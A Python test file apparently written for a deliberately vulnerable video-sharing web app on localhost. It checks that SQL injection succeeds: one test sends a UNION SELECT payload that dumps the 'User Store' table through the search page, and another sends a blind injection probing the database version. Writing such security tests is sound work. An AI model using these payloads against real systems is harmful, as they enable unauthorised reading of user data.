import requests

def test_1_sql_injection():
    params = {'username':'new', 'password':'new'}
    page = requests.get('https://localhost/python/signin.py', params=params, verify=False)
    page.encoding = 'utf-8'
    cookiename = page.text.strip().split(';')[0].split('=')[0]
    cookievalue = page.text.strip().split(';')[0].split('=')[1]
    cookies = {cookiename: cookievalue}
    params = {'search':'1" UNION Select * From `User Store` #'}
    page = requests.get('https://localhost/python/search.py', params=params, cookies=cookies, verify=False)
    assert 'User: new Title: new' in page.text


def test_2_blind_sql_injection():
    params = {'username':'new', 'password':'new'}
    page = requests.get('https://localhost/python/signin.py', params=params, verify=False)
    page.encoding = 'utf-8'
    cookiename = page.text.strip().split(';')[0].split('=')[0]
    cookievalue = page.text.strip().split(';')[0].split('=')[1]
    cookies = {cookiename: cookievalue}
    params = {'fileinlink':'https://www.youtube.com/watch?v=oaW1frpSSQQ', 'videoname':'testVid', 'filein':' '}
    page = requests.get('https://localhost/python/upload.py', params=params, cookies=cookies, verify=False)
    params = {'search':'testVid" and substring(@@version,1,1)=5 #'}
    page = requests.get('https://localhost/python/search.py', params=params, cookies=cookies, verify=False)
    assert 'User: new Title: testVid' in page.text
